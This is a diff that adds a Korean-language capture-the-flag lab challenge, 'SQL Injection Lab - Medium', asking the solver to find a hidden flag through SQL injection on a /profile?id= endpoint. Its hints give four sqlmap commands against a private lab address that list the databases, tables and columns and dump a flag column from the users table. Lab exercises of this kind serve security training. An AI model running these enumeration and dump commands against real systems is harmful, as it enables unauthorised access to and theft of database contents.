@@ -1,0 +1,18 @@
+📌 문제 제목
+SQL Injection Lab - Medium
+
+🎯 문제 설명
+당신은 특정 사용자의 ID를 통해 정보를 조회할 수 있는 API를 공격해야 합니다.
+SQL Injection을 이용해 내부 DB 구조를 파악하고, 숨겨진 FLAG를 추출하세요.
+
+🧠 난이도
+중 (Medium)
+
+💡 힌트
+- `/profile?id=1`로 조회
+- 출력은 최소한이므로, sqlmap의 구조 열거 기능을 활용하세요.
+
+sqlmap -u "http://192.168.1.203:8000/profile?id=1" --batch --dbs
+sqlmap -u "http://192.168.1.203:8000/profile?id=1" --tables --batch
+sqlmap -u "http://192.168.1.203:8000/profile?id=1" -T users --columns --batch
+sqlmap -u "http://192.168.1.203:8000/profile?id=1" -T users -C flag --dump --where "id=5" --batch
